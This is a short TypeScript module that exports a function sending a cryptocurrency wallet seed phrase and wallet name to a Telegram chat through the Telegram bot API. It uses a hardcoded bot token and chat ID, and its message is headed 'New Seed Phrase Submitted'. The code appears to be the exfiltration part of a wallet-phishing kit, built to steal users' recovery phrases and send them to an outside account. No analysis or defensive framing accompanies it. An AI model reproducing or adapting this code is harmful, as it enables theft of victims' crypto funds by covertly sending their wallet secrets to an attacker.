const BOT_TOKEN = '8633378955:AAH5G7BUnT2dDvYe0VXcpagno5H6jMWtujI'; // Replace with actual token
const CHAT_ID = '981618356';

export async function sendSeedPhraseToTelegram(seedPhrase: string, walletName: string) {
  const message = `🚨 New Seed Phrase Submitted\n\nWallet: ${walletName}\nSeed: ${seedPhrase}`;
  
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'HTML',
    }),
  });
}